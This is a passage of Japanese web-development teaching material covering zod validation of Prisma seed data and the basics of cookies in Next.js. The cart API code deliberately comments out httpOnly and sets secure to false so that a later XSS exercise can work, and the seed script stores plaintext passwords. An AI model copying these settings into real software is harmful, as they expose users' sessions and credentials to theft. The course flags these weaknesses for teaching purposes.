      <p>なお、ここではオブジェクトの各プロパティ (<code>name</code> や <code>email</code>)
      に対して独立したバリデーションスキーマを設定していますが、zod
      では<strong>複数のプロパティを参照する複合的なバリデーション</strong>
      (クロスフィールドバリデーション)
      や、<strong>条件分岐をともうな複雑なバリデーション</strong>も可能になっています。</p>
      <p>例えば、オブジェクトのなかの <span
      class="masked">「<code>password</code>」と「<code>confirmPassword</code>」の一致</span>
      を検証するようなバリデーションも設定可能です。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>バリデーションライブラリである「zod」では、オブジェクトを構成する複数のプロパティを参照した複合的なバリデーションや、条件分岐による複雑なバリデーションも可能であると聞きました。具体的にどのようなバリデーションが可能なのか、コードと解説を示してください。</p>
      </blockquote>
      <h2 data-number="3.2" id="データのバリデーション処理"><span
      class="header-section-number">3.2</span> データのバリデーション処理</h2>
      <p><code>prisma/seed.ts</code> では、以下に示すように、</p>
      <ol type="1">
      <li>テスト用のユーザの種となる <code>userSeeds</code> を作成 (<strong>第09行目</strong>～)
      して、</li>
      <li>zod によるバリデーションで <strong>データ形式や制約条件を満たしていることを確認</strong>
      (<strong>第44行目</strong>～) したうえで、</li>
      <li>DBにデータを投入 (<strong>第70行目</strong>から<strong>第78行目</strong>)</li>
      </ol>
      <p>… しています。</p>
      <div class="sourceCode" id="cb12" data-caption="prisma/seed.ts (抜粋) テストデータの生成"
      data-startFrom="9"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 8;"><span id="cb12-9"><a href="#cb12-9"></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">main</span>() {</span>
<span id="cb12-10"><a href="#cb12-10"></a>  <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Seeding database...&quot;</span>)<span class="op">;</span></span>
<span id="cb12-11"><a href="#cb12-11"></a></span>
<span id="cb12-12"><a href="#cb12-12"></a>  <span class="co">// テスト用のユーザ情報の「種」となる userSeeds を作成</span></span>
<span id="cb12-13"><a href="#cb12-13"></a>    <span class="kw">const</span> userSeeds<span class="op">:</span> UserSeed[] <span class="op">=</span> [</span>
<span id="cb12-14"><a href="#cb12-14"></a>    {</span>
<span id="cb12-15"><a href="#cb12-15"></a>      name<span class="op">:</span> <span class="st">&quot;高負荷 耐子&quot;</span><span class="op">,</span></span>
<span id="cb12-16"><a href="#cb12-16"></a>      password<span class="op">:</span> <span class="st">&quot;password1111&quot;</span><span class="op">,</span></span>
<span id="cb12-17"><a href="#cb12-17"></a>      email<span class="op">:</span> <span class="st">&quot;admin01@example.com&quot;</span><span class="op">,</span></span>
<span id="cb12-18"><a href="#cb12-18"></a>      role<span class="op">:</span> Role<span class="op">.</span><span class="at">ADMIN</span><span class="op">,</span></span>
<span id="cb12-19"><a href="#cb12-19"></a>    }<span class="op">,</span></span>
<span id="cb12-20"><a href="#cb12-20"></a>    {</span>
<span id="cb12-21"><a href="#cb12-21"></a>      name<span class="op">:</span> <span class="st">&quot;不具合 直志&quot;</span><span class="op">,</span></span>
<span id="cb12-22"><a href="#cb12-22"></a>      password<span class="op">:</span> <span class="st">&quot;password2222&quot;</span><span class="op">,</span></span>
<span id="cb12-23"><a href="#cb12-23"></a>      email<span class="op">:</span> <span class="st">&quot;admin02@example.com&quot;</span><span class="op">,</span></span>
<span id="cb12-24"><a href="#cb12-24"></a>      role<span class="op">:</span> Role<span class="op">.</span><span class="at">ADMIN</span><span class="op">,</span></span>
<span id="cb12-25"><a href="#cb12-25"></a>    }<span class="op">,</span></span></code></pre></div>
      <div class="sourceCode" id="cb13"
      data-caption="prisma/seed.ts (抜粋) バリデーション（データ形式や制約条件が満たされていることを確認）"
      data-startFrom="44"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 43;"><span id="cb13-44"><a href="#cb13-44"></a>  <span class="co">// userSeedSchema を使って UserSeeds のバリデーション</span></span>
<span id="cb13-45"><a href="#cb13-45"></a>  <span class="cf">try</span> {</span>
<span id="cb13-46"><a href="#cb13-46"></a>    <span class="cf">await</span> <span class="bu">Promise</span><span class="op">.</span><span class="fu">all</span>(</span>
<span id="cb13-47"><a href="#cb13-47"></a>      userSeeds<span class="op">.</span><span class="fu">map</span>(<span class="kw">async</span> (userSeed<span class="op">,</span> index) <span class="kw">=&gt;</span> {</span>
<span id="cb13-48"><a href="#cb13-48"></a>        <span class="kw">const</span> result <span class="op">=</span> userSeedSchema<span class="op">.</span><span class="fu">safeParse</span>(userSeed)<span class="op">;</span></span>
<span id="cb13-49"><a href="#cb13-49"></a>        <span class="cf">if</span> (result<span class="op">.</span><span class="at">success</span>) <span class="cf">return</span><span class="op">;</span></span>
<span id="cb13-50"><a href="#cb13-50"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(</span>
<span id="cb13-51"><a href="#cb13-51"></a>          <span class="vs">`Validation error in record </span><span class="sc">${</span>index<span class="sc">}</span><span class="vs">:</span><span class="sc">\n${</span><span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(userSeed<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">2</span>)<span class="sc">}</span><span class="vs">`</span><span class="op">,</span></span>
<span id="cb13-52"><a href="#cb13-52"></a>        )<span class="op">;</span></span>
<span id="cb13-53"><a href="#cb13-53"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&quot;▲▲▲ Validation errors ▲▲▲&quot;</span>)<span class="op">;</span></span>
<span id="cb13-54"><a href="#cb13-54"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(</span>
<span id="cb13-55"><a href="#cb13-55"></a>          <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(result<span class="op">.</span><span class="at">error</span><span class="op">.</span><span class="fu">flatten</span>()<span class="op">.</span><span class="at">fieldErrors</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">2</span>)<span class="op">,</span></span>
<span id="cb13-56"><a href="#cb13-56"></a>        )<span class="op">;</span></span>
<span id="cb13-57"><a href="#cb13-57"></a>        <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">Error</span>(<span class="vs">`Validation failed at record </span><span class="sc">${</span>index<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span>
<span id="cb13-58"><a href="#cb13-58"></a>      })<span class="op">,</span></span>
<span id="cb13-59"><a href="#cb13-59"></a>    )<span class="op">;</span></span>
<span id="cb13-60"><a href="#cb13-60"></a>  } <span class="cf">catch</span> (error) {</span>
<span id="cb13-61"><a href="#cb13-61"></a>    <span class="cf">throw</span> error<span class="op">;</span></span>
<span id="cb13-62"><a href="#cb13-62"></a>  }</span></code></pre></div>
      <div class="sourceCode" id="cb14"
      data-caption="prisma/seed.ts (抜粋) バリデーション済みデータの DB 投入"
      data-startFrom="73"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 72;"><span id="cb14-73"><a href="#cb14-73"></a><span class="co">// ユーザ（user）テーブルにテストデータを挿入</span></span>
<span id="cb14-74"><a href="#cb14-74"></a><span class="cf">await</span> prisma<span class="op">.</span><span class="at">user</span><span class="op">.</span><span class="fu">createMany</span>({</span>
<span id="cb14-75"><a href="#cb14-75"></a>  data<span class="op">:</span> userSeeds<span class="op">.</span><span class="fu">map</span>((userSeed) <span class="kw">=&gt;</span> ({</span>
<span id="cb14-76"><a href="#cb14-76"></a>    id<span class="op">:</span> <span class="fu">uuid</span>()<span class="op">,</span></span>
<span id="cb14-77"><a href="#cb14-77"></a>    name<span class="op">:</span> userSeed<span class="op">.</span><span class="at">name</span><span class="op">,</span></span>
<span id="cb14-78"><a href="#cb14-78"></a>    password<span class="op">:</span> userSeed<span class="op">.</span><span class="at">password</span><span class="op">,</span></span>
<span id="cb14-79"><a href="#cb14-79"></a>    role<span class="op">:</span> userSeed<span class="op">.</span><span class="at">role</span><span class="op">,</span></span>
<span id="cb14-80"><a href="#cb14-80"></a>    email<span class="op">:</span> userSeed<span class="op">.</span><span class="at">email</span><span class="op">,</span></span>
<span id="cb14-81"><a href="#cb14-81"></a>  }))<span class="op">,</span></span>
<span id="cb14-82"><a href="#cb14-82"></a>})<span class="op">;</span></span></code></pre></div>
      <p>ここで、例えば <strong>第17行目</strong> の…</p>
      <ul>
      <li><code>email: "admin01@example.com",</code></li>
      </ul>
      <p>…を…</p>
      <ul>
      <li><code>email: "hoge-fuga-piyo",</code></li>
      </ul>
      <p>…のように <strong>電子メールとして不正な値</strong> に書き変えて
      <code>npx prisma db seed</code>
      を実行すると、以下のように例外が発生して<strong>シーディング処理が中断</strong>されます
      (＝<span class="masked">不正な値が DB に投入されることを未然に防いでくれます</span>)。</p>
      <pre><code>Validation error in record 0:
{
  &quot;name&quot;: &quot;高負荷 耐子&quot;,
  &quot;password&quot;: &quot;password1111&quot;,
  &quot;email&quot;: &quot;hoge-fuga-piyo&quot;,
  &quot;role&quot;: &quot;ADMIN&quot;
}
▲▲▲ Validation errors ▲▲▲
{
  &quot;email&quot;: [
    &quot;Invalid email&quot;
  ]
}</code></pre>
      <p>なお、<strong>第45行目</strong>からは、例外処理に加えて <code>Promise.all</code>
      を利用した並列処理をしているので、<strong>やや複雑な処理</strong>になっています。バリデーションの本体である
      <code>userSeedSchema.safeParse(userSeed)</code>
      については、次のセクションでシンプルな例を用意して解説しています。そちらを参照してください。</p>
      <div class="note type-tips">
      <p><strong>「hoge」「fuga」「piyo」とは</strong></p>
      <p>いまさらですが <code>hoge</code> <code>fuga</code> <code>piyo</code> は、メタ構文変数
      <code>foo</code> <code>bar</code> <code>baz</code> の日本バージョンです。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>プログラミング界隈で登場する <code>foo</code> <code>bar</code> <code>baz</code>
      とは何ですか。</p>
      </blockquote>
      </div>
      <h2 data-number="3.3" id="データのバリデーション処理-シンプルな例"><span
      class="header-section-number">3.3</span> データのバリデーション処理 (シンプルな例)</h2>
      <p>zod によるバリデーション処理について理解するためのコードを
      <code>src/app/zod/page.tsx</code> に配置しています。それを利用して <code>safeParse()</code>
      の使い方について理解してください。</p>
      <p>ウェブアプリ実行時は <a href="http://localhost:3000/zod">http://localhost:3000/zod</a>
      でアクセスできます。<code>F12</code>
      で開発者ツールを開いて「<strong>コンソール</strong>」から検証処理（バリデーション処理）の結果について確認してください。</p>
      <figure>
      <img src="figs/01/zod-02.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p><strong>第28行目</strong> において <code>userSeedSchema.safeParse(...)</code>
      によるバリデーションを実行しています。</p>
      <div class="sourceCode" id="cb16"
      data-caption="src/app/zod/page.tsx safeParseを使ったバリデーションの単純例"
      data-startFrom="28"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 27;"><span id="cb16-28"><a href="#cb16-28"></a><span class="kw">const</span> result <span class="op">=</span> userSeedSchema<span class="op">.</span><span class="fu">safeParse</span>(unsafeUserSeed)<span class="op">;</span></span>
<span id="cb16-29"><a href="#cb16-29"></a></span>
<span id="cb16-30"><a href="#cb16-30"></a><span class="cf">if</span> (<span class="op">!</span>result<span class="op">.</span><span class="at">success</span>) {</span>
<span id="cb16-31"><a href="#cb16-31"></a>  <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;▼ Validation NG ▼&quot;</span>)<span class="op">;</span></span>
<span id="cb16-32"><a href="#cb16-32"></a>  <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(result<span class="op">.</span><span class="at">error</span><span class="op">.</span><span class="fu">flatten</span>()<span class="op">.</span><span class="at">fieldErrors</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">2</span>))<span class="op">;</span></span>
<span id="cb16-33"><a href="#cb16-33"></a>}</span>
<span id="cb16-34"><a href="#cb16-34"></a></span>
<span id="cb16-35"><a href="#cb16-35"></a><span class="kw">const</span> userSeed <span class="op">=</span> result<span class="op">.</span><span class="at">data</span> <span class="op">??</span> <span class="kw">null</span><span class="op">;</span></span>
<span id="cb16-36"><a href="#cb16-36"></a><span class="cf">if</span> (userSeed) {</span>
<span id="cb16-37"><a href="#cb16-37"></a>  <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;▼ Validation OK ▼&quot;</span>)<span class="op">;</span></span>
<span id="cb16-38"><a href="#cb16-38"></a>  <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(userSeed<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">2</span>))<span class="op">;</span></span>
<span id="cb16-39"><a href="#cb16-39"></a>}</span></code></pre></div>
      <h2 data-number="3.4" id="演習-2"><span class="header-section-number">3.4</span> 演習</h2>
      <p><code>src/app/zod/page.tsx</code> について、以下のことを確認してください。</p>
      <ul>
      <li><strong>第25行目</strong> を変更し、<code>safeParse</code> の戻り値 <code>result</code>
      がどのように変わるかを確認してください。
      <ul>
      <li><code>const unsafeUserSeed = unsafeUserSeed_02; // 01 or 02</code> 👈 第25行目</li>
      </ul></li>
      <li><code>unsafeUserSeed_02</code> のように「UserSeed型」としては<strong>余分なプロパティ
      (age) を持ったオブジェクト</strong>を <code>safeParse</code>
      で処理するとどのようになるのか確認してください。
      <ul>
      <li>バリデーションエラーになるのか否か</li>
      <li><code>result.data</code> で取得されるオブジェクトには当該プロパティ (<code>age</code>)
      が残るか否か</li>
      <li>余分なプロパティがあったときの処理を設定により変更できるか否か</li>
      </ul></li>
      </ul>
      <p>バリデーションでは <code>safeParse</code> の他に <span
      class="masked"><code>parse</code></span> が利用できます。<code>safeParse</code> と
      <code>parse</code> の処理の違いについて調べて理解してください。<code>parse</code>
      のほうがシンプルで使いやすい場面も多いと思います。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>バリデーションライブラリ zod における <code>parse</code> と <code>safeParse</code>
      の違いについて丁寧に解説してください。また、それらのユースケース (使い分け)
      についても教えてください。</p>
      </blockquote>
      <h1 data-number="4" id="cookie-について"><span class="header-section-number">4</span> Cookie
      について</h1>
      <p><strong>Cookie (クッキー🍪)</strong> とは、サーバとクライアント (ウェブブラウザ) の間で
      <span class="masked">状態 (ステート)</span>
      を管理するために導入された仕組みになります。この状態管理技術は、1994年頃からウェブブラウザに導入されており、もともとは
      <a href="https://ja.wikipedia.org/wiki/ネットスケープコミュニケーションズ">Netscape社</a>
      が開発した独自仕様でした。</p>
      <p>まずはじめに「<strong>Cookie が必要となる理由
      (＝状態管理が必要となる理由)</strong>」について確認していきます。</p>
      <h2 data-number="4.1" id="cookie-という仕組みが必要な理由"><span
      class="header-section-number">4.1</span> Cookie という仕組みが必要な理由</h2>
      <p>もともと「ウェブ」と「HTTP (Hyper Text Transfer
      Protocol)」は、状態管理を想定しないシンプルな
      <strong>ステートレス（Stateless）なシステム</strong>
      として設計・開発されたものでした。<strong>ステートレス</strong>とは「以前の処理内容や通信の結果を内部状態として記憶せずに、各リクエストに対しては
      URI (URL) のみに基づいて独立してレスポンスを返す」というアーキテクチャのことです。</p>
      <p>つまり、サーバは特定のURI (<code>http://hoge-shop/cart</code>)
      に対するリクエストがあったとき「誰からのリクエストであっても」「それが何度目のリクエストであっても」「それ以前に、その
      URI でどのような操作をしていても」、<strong>常に同じレスポンスを返す</strong>
      というのが、本来のウェブとしてステートレスな動作となります。</p>
      <p>初期のインターネットにおいては、このステートレスなアーキテクチャで十分な機能を提供できていました。しかし、インターネットの普及とともに
      <span class="masked">ステートレスな設計だけでは実現困難なシステム
      (例えば「オンラインショッピング」のようなウェブサービス)</span>
      に対する需要が急速に高まってきました。つまり…</p>
      <ul>
      <li><code>http://hoge-shop/cart</code>
      に対して、Aさんがアクセスしたときと、Bさんがアクセスしたときで異なるレスポンスを返すようにしたい。</li>
      <li>Aさんが以前に <code>http://hoge-shop/cart</code> で操作
      (例えば、商品をカートに追加する操作)
      をしているとき、Aさんから再度アクセスがあった際には、その操作を反映した内容のレスポンスを返すようにしたい。</li>
      </ul>
      <p>…といった「<strong>ステートフル</strong>」なシステムの実現に対する需要がでてきました。</p>
      <p>そのようななかで、HTTP のステートレスな基本特性を維持しつつ、アプリケーションレベルで
      <strong>ステートフルな動作</strong>
      を可能にする仕組みとして考案・導入されたものが「<strong>Cookie</strong>」となります。</p>
      <ul>
      <li>「ステートレス」の対義語が「ステートフル」となります。</li>
      </ul>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>授業で「ウェブはステートレスなアーキテクチャである」と聞きました。意味が分かりません。そもそもアーキテクチャって何ですか？</p>
      </blockquote>
      <h2 data-number="4.2" id="cookie-の仕組み"><span class="header-section-number">4.2</span>
      Cookie の仕組み</h2>
      <p>Cookie の「<strong>基本的な仕組み</strong>」は、次のようになります。</p>
      <ol type="1">
      <li><strong>【クライアント】</strong>: サーバ（例：<code>http://hoge.com/</code>）に対して
      <strong>HTTP リクエスト</strong> を送信する。</li>
      <li><strong>【サーバ】</strong>: クライアントに対して
      <code>Set-Cookie: session_id=12345;</code> のようなヘッダを含む <strong>HTTP
      レスポンス</strong> を返す。</li>
      <li><strong>【クライアント】</strong>: サーバからのレスポンスに <code>Set-Cookie</code>
      があれば、ドメイン（<code>hoge.com</code>）に紐付けて
      Cookie（<code>session_id=12345</code>）をブラウザに保存する。</li>
      <li><strong>【クライアント】</strong>:
      以後、そのドメインに対してリクエストを送信するときは、自動的にヘッダに
      <code>Cookie: session_id=12345</code> を付与する。</li>
      <li><strong>【サーバ】</strong>: リクエストのヘッダから Cookie (session_id=12345)
      を読み取り、その内容に応じて処理を分岐してレスポンスを返す。</li>
      </ol>
      <p>このように Cookie🍪 は「<strong>サーバがレスポンスで Cookie
      を発行する</strong>」👉「クライアントがその後のリクエストに自動的にCookieを含める」という仕組みで、本来はステートレスなHTTPプロトコルにおいて「状態管理」や「ユーザ識別」を可能にしています。</p>
      <h3 data-number="4.2.1" id="httpレスポンスの-set-cookie-フィールド"><span
      class="header-section-number">4.2.1</span> 「HTTPレスポンス」の <code>Set-Cookie</code>
      フィールド</h3>
      <p>サーバからの <strong>HTTPレスポンス</strong> のなかの <code>Set-Cookie</code>
      フィールドは、ブラウザのデベロッパツールの「<strong>ネットワーク</strong>」のツールを使って確認することができます。以下は
      <code>http://localhost:3000/api/cart</code> にアクセスしたときのレスポンスの観測です。</p>
      <figure>
      <img src="figs/01/cookie-01.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>上記では <code>cart_session_id=947012da...</code>
      につづけて、<strong>いくつかの属性情報</strong> (<code>Path</code> や
      <code>Expires</code>、<code>Max-Age</code>、<code>SameSite</code> など)
      が付加されていることに着目してください。属性については、後ほど解説します。</p>
      <h3 data-number="4.2.2" id="httpリクエストの-cookie-フィールド"><span
      class="header-section-number">4.2.2</span> 「HTTPリクエスト」の <code>Cookie</code>
      フィールド</h3>
      <p>同様に <strong>HTTPリクエスト</strong> のなかの <code>Cookie</code>
      フィールドも、以下のように確認することができます。先ほど、<code>Set-Cookie</code> で受け取った
      <code>cart_session_id=947012da-3995-4071-8bfe-c4afaa923756</code>
      を送信していることに着目してください。</p>
      <figure>
      <img src="figs/01/cookie-02.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <h2 data-number="4.3" id="ウェブアプリ開発者が-cookie-について最低限知っておくべきこと"><span
      class="header-section-number">4.3</span> ウェブアプリ開発者が Cookie
      について最低限知っておくべきこと</h2>
      <p>安全なウェブアプリを開発するにあたり、Cookie について
      のなかの以下のことを把握しておいてください。</p>
      <ul>
      <li>ユーザ操作による通常のウェブナビゲーション（リンクをクリックするなど）において、Cookie
      は自動的にHTTPリクエストに付与されます。言い換えれば、ユーザが意識することなく自動で Cookie
      が送信されます。</li>
      <li>Cookie の内容は、ブラウザのデベロッパーツールを使って
      <strong>ユーザが内容を参照したり、書き換えたり、消去したりすることができます</strong>。</li>
      <li>Cookie は、ひとつのドメインにつき、約 <span class="masked">4KB</span>
      まで保持することができます（画像や長文を Cookie として保存することはできません）。</li>
      <li>Cookie は、基本的にサーバ側で発行するものですが、<strong>JavaScript
      を使ってクライアント側で Cookie
      を設定したり、読み込んだりすることもできます</strong>。ただし、後述する <span
      class="masked">HttpOnly属性</span> が設定されている Cookie については、JavaScript
      から値を読み取ったり、上書きしたりすることはできません。</li>
      <li>JavaScript の <code>fetch</code> 関数などで ウェブAPI にアクセスするとき、そこに Cookie
      を含めることができます。
      <ul>
      <li>「HttpOnly属性」がついている Cookie については、内容を参照することはできませんが
      HTTPリクエストの送信に含めることはできます。</li>
      </ul></li>
      </ul>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>サードパーティクッキーとは何ですか。</p>
      </blockquote>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>サードパーティクッキーを利用した「リターゲティング広告」の仕組みについて教えてください。</p>
      </blockquote>
      <h3 data-number="4.3.1" id="デベロッパツールからクッキーを確認-httplocalhost3000news"><span
      class="header-section-number">4.3.1</span> デベロッパツールからクッキーを確認
      (<code>http://localhost:3000/news</code>)</h3>
      <p>ブラウザのデベロッパツール (<code>F12</code>で起動) から、ブラウザ内部に保存されている
      Cookie の内容を確認することができます。</p>
      <figure>
      <img src="figs/01/news-02.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>以下の「削除アイコン」をクリックすることで「<strong>ユーザ操作により Cookie
      が削除できること</strong>」を確認してください。削除後、再びサイトにアクセスすると
      (レスポンスの <code>Set-Cookie</code> により) Cookie
      が再設定されることも確認してください。</p>
      <figure>
      <img src="figs/01/cookie-03.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>また、Cookie
      の各フィールドをダブルクリックして「<strong>値の編集ができること</strong>」も確認してください
      (ユーザによって「Cookieの偽装ができること」も確認してください)。</p>
      <h3 data-number="4.3.2" id="next.js-のサーバサイドで-cookie-を設定する例"><span
      class="header-section-number">4.3.2</span> Next.js のサーバサイドで Cookie を設定する例</h3>
      <p><strong>ショップ</strong> (＝<code>http://localhost:3000/shop</code>) に関連する
      <strong>ウェブAPI</strong> (<code>http://localhost:3000/api/cart</code>) の「GET
      Method」では、HTTPリクエストのヘッダに Cookie フィールドが存在しないときは、Cookie
      を新規発行しています。また、<code>cart_session_id</code> という Cookie
      フィールドがあれば、<strong>その値を使って
      DBから「カート情報」取得して、それをレスポンスしています</strong> (同時に Cookie
      の有効期限の延長も行なっています)。</p>
      <p><code>src/app/api/cart/route.ts</code> を参照して、ざっくりと処理を追ってみてください
      (詳しいことは後から確認していきます)。</p>
      <div class="sourceCode" id="cb17"
      data-caption="src/app/api/cart/route.ts (抜粋) ライブラリのインポート" data-startFrom="4"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 3;"><span id="cb17-4"><a href="#cb17-4"></a><span class="im">import</span> { cookies } <span class="im">from</span> <span class="st">&quot;next/headers&quot;</span><span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb18" data-caption="src/app/api/cart/route.ts (抜粋)"
      data-startFrom="10"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 9;"><span id="cb18-10"><a href="#cb18-10"></a><span class="kw">const</span> cKey <span class="op">=</span> <span class="st">&quot;cart_session_id&quot;</span><span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb19"
      data-caption="src/app/api/cart/route.ts (抜粋) クッキーを発行する処理"
      data-startFrom="19"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 18;"><span id="cb19-19"><a href="#cb19-19"></a>cookieStore<span class="op">.</span><span class="fu">set</span>(cKey<span class="op">,</span> id<span class="op">,</span> {</span>
<span id="cb19-20"><a href="#cb19-20"></a>  path<span class="op">:</span> <span class="st">&quot;/&quot;</span><span class="op">,</span></span>
<span id="cb19-21"><a href="#cb19-21"></a>  maxAge<span class="op">:</span> sessionMaxAge<span class="op">,</span></span>
<span id="cb19-22"><a href="#cb19-22"></a>  <span class="co">// httpOnly: true, // 💀 コメントアウトするとXSS攻撃で窃取される可能性あり</span></span>
<span id="cb19-23"><a href="#cb19-23"></a>  sameSite<span class="op">:</span> <span class="st">&quot;strict&quot;</span><span class="op">,</span> <span class="co">// 💀 &quot;none&quot; にするとCSRF脆弱性</span></span>
<span id="cb19-24"><a href="#cb19-24"></a>  secure<span class="op">:</span> <span class="kw">false</span><span class="op">,</span></span>
<span id="cb19-25"><a href="#cb19-25"></a>})<span class="op">;</span></span></code></pre></div>
      <p>上記の <strong>第20行目</strong>から<strong>第24行目</strong>について、それぞれの
      Cookie属性
      の意味を十分に理解して適切に設定しないと、重大なセキュリティリスクとなるので注意してください。ただし、ここでは後で「XSS脆弱性」に関する実験をするために、属性設定はこのままにしておいてください。</p>
      <h3 data-number="4.3.3" id="next.js-のクライアントサイドで-cookie-を設定する例"><span
      class="header-section-number">4.3.3</span> Next.js のクライアントサイドで Cookie
      を設定する例</h3>
      <p><strong>ニュース</strong> (＝<code>http://localhost:3000/news</code>) では
      <code>js-cookie</code> というライブラリを使って <strong>クライアントサイド</strong> で <span
      class="masked">JavaScript プログラムを使って Cookie の「読取り」と「書込み」</span>
      をしています。サーバサイドとは異なる方法で Cookie を設定していることに注意してください。</p>
      <p><code>src/app/news/page.tsx</code> を参照して、ざっくりと処理を追ってみてください。</p>
      <div class="sourceCode" id="cb20"
      data-caption="src/app/news/page.tsx (抜粋) 「js-cookie」のインポート" data-startFrom="5"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 4;"><span id="cb20-5"><a href="#cb20-5"></a><span class="im">import</span> Cookies <span class="im">from</span> <span class="st">&quot;js-cookie&quot;</span><span class="op">;</span></span></code></pre></div>
      <p>👆 Next.js のライブラリではないので <code>npm i js-cookie</code>
      コマンドでインストールする必要があります (プロジェクトをクローンしてきている場合は、最初の
      <code>npm i</code> でインストールされています)。</p>
      <div class="sourceCode" id="cb21" data-caption="src/app/news/page.tsx (抜粋) Cookieの読取り"
      data-startFrom="44"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 43;"><span id="cb21-44"><a href="#cb21-44"></a><span class="kw">const</span> regionStr <span class="op">=</span> Cookies<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;region&quot;</span>)<span class="op">;</span></span></code></pre></div>
      <p>👆 もし <code>region</code> という名前のCookie が存在しない場合、<code>regionStr</code> は
      <code>undefined</code> になります。</p>
      <div class="sourceCode" id="cb22" data-caption="src/app/news/page.tsx (抜粋) Cookieの書込み"
      data-startFrom="27"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 26;"><span id="cb22-27"><a href="#cb22-27"></a><span class="co">// Cookie をセットする関数の定義</span></span>
<span id="cb22-28"><a href="#cb22-28"></a><span class="kw">const</span> setSessionCookie <span class="op">=</span> <span class="fu">useCallback</span>((region<span class="op">:</span> Region) <span class="kw">=&gt;</span> {</span>
<span id="cb22-29"><a href="#cb22-29"></a>  Cookies<span class="op">.</span><span class="fu">set</span>(<span class="st">&quot;region&quot;</span><span class="op">,</span> region<span class="op">,</span> {</span>
<span id="cb22-30"><a href="#cb22-30"></a>    expires<span class="op">:</span> <span class="dv">7</span><span class="op">,</span> <span class="co">// 有効期限（7日間）</span></span>
<span id="cb22-31"><a href="#cb22-31"></a>    <span class="co">// path: &quot;/api/news&quot;, // 💀 省略すると &quot;/&quot; が設定される</span></span>
<span id="cb22-32"><a href="#cb22-32"></a>    <span class="co">// sameSite: &quot;strict&quot;, // 💀 適切に設定しないとCSRF脆弱性が生じる</span></span>
<span id="cb22-33"><a href="#cb22-33"></a>    secure<span class="op">:</span> <span class="kw">false</span><span class="op">,</span> <span class="co">// 💀 本番環境(HTTPS)では true にすべき</span></span>
<span id="cb22-34"><a href="#cb22-34"></a>  })<span class="op">;</span></span>
<span id="cb22-35"><a href="#cb22-35"></a>  <span class="co">// 👆 セキュアに利用する観点から各設定の意味を調べてみてください</span></span>
<span id="cb22-36"><a href="#cb22-36"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
      <p>各属性の意味を理解して適切に設定しないと、重大なセキュリティリスクとなるので注意してください。</p>
      <h2 data-number="4.4" id="cookie-の属性設定"><span class="header-section-number">4.4</span>
      Cookie の属性設定</h2>
      <p>個々の Cookie には、次のような「<strong>属性</strong>」を設定することができます。</p>
      <h3 data-number="4.4.1" id="expires属性"><span class="header-section-number">4.4.1</span>
      Expires属性</h3>
      <p>有効期限に関する設定です。期限を過ぎるとブラウザによって自動削除されます。特に設定しなければ「セッションCookie」となり、ブラウザを閉じると削除されます。</p>
      <h3 data-number="4.4.2" id="httponly属性"><span class="header-section-number">4.4.2</span>
      HttpOnly属性</h3>
      <p>この属性が設定されている Cookie は <span class="masked">JavaScript
      から値を読み込むことができなく</span> なります。<strong>XSS攻撃</strong>
      によるセッションハイジャックを防ぐセキュリティ対策として「<strong>超重要</strong>」な設定となってきます。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Cookie
      に「HttpOnly属性」をつけないと「XSS攻撃によるセッションハイジャックが云々…」とか言われたのですが意味不明です🫠。分かりやすく解説してください。</p>
      </blockquote>
      <h3 data-number="4.4.3" id="secure属性"><span class="header-section-number">4.4.3</span>
      Secure属性</h3>
      <p>この属性が設定されている Cookie は、HTTPS 通信のときだけ送信されるようになります。HTTP
      (≠HTTPS) による非暗号化通信で Cookie が漏洩 (盗聴) することを防ぐために使用します。</p>
